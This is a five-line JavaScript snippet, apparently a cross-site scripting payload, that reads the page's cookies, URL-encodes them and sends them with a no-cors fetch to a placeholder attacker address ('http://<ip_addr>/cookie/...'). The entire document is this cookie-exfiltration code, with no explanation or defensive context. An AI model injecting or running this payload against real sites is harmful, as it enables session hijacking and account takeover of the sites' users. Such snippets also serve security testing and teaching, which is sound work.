var AttackerURL = "http://<ip_addr>";
var DocumentCookie = encodeURIComponent(document.cookie);
fetch([AttackerURL, "/cookie/", DocumentCookie].join(''), {
	mode: 'no-cors'
});
